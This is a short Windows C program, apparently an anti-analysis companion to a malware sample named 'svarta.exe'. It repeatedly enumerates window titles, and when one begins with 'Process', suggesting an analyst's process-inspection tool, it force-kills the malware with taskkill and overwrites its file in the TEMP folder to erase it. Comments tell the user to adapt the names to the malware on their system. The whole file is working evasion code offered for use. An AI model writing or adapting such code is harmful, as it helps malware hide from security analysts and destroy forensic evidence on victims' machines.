#include <stdio.h>
#include <windows.h>
#include <tchar.h>
TCHAR malpath[MAX_PATH];
TCHAR path[MAX_PATH];

int createpath(LPCTSTR exename, LPCTSTR environmentvar) {
	GetEnvironmentVariable(environmentvar, path, MAX_PATH);
	strcat_s(malpath, strlen(malpath)+strlen(path)+1, path);
	strcat_s(malpath, strlen(malpath)+strlen(exename)+1, exename);
}


BOOL CALLBACK monster(HWND hwnd, LPARAM opt){
	TCHAR cwtitle[MAX_PATH];
	GetWindowTextA(hwnd, cwtitle, MAX_PATH);
	int jamfora_1 = strncmp(cwtitle, "Process", strlen("Process"));
	if (jamfora_1 == 0) {
		printf("[!] Possibly in analysis environment!\n");
		printf("[-] Removing main malware!\n");
		//change svarta.exe to malware on system
		system("taskkill /F /T /IM svarta.exe");
		DWORD bwritten;
		HANDLE cmal = CreateFileA(malpath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (cmal != INVALID_HANDLE_VALUE) {
			printf("[-] Opened main malware\n");
		}
		int wmal = WriteFile(cmal, "00000", strlen("00000"), &bwritten, NULL);
		if (wmal != 0) {
			printf("[-] Successfully overwritten malware!\n");
		}
		//exit(0);
	}
	return TRUE;

}

int main() {
	//change params to match malware on system (main malware name prepended with \\ & environment var where malware is)
	createpath("\\svarta.exe", "TEMP");
	while (TRUE) {
		EnumWindows(monster, NULL);
	}
}
